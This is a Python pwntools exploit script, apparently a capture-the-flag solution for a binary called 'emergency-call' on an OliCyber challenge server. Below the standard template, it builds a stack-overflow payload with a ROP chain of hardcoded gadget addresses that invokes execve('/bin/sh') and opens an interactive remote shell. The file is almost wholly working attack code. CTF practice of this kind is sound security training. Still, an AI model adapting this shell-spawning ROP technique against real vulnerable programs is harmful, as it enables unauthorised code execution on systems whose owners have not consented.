#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=emergency.challs.olicyber.it' '--port=10306' emergency-call
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('emergency-call')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'emergency.challs.olicyber.it'
port = int(args.PORT or 10306)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
catch syscall
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# sys_name    rax     rdi          rsi        rdx
# execve      0x3b    *filename    *argv      *env 
#                     /bin/sh      0          0

# ROP gadget
first_input_addr = 0x404000
syscall = 0x40101a
pop_rdi = 0x401032
xor_rax_rdi = 0x401038
pop_rsi = 0x401034
pop_rdx = 0x401036

io.sendafter(b'> ',b'/bin/sh')

payload = flat(
	b'A'*32,
	b'B'*8,
	p64(pop_rdi),
	p64(0x3b),
	p64(xor_rax_rdi),
	p64(pop_rdi),
	p64(first_input_addr),
	p64(pop_rsi),
	p64(0x0),
    p64(pop_rdx),
    p64(0x0),
    p64(syscall),
)    

io.sendafter(b'> ', payload)

io.interactive()

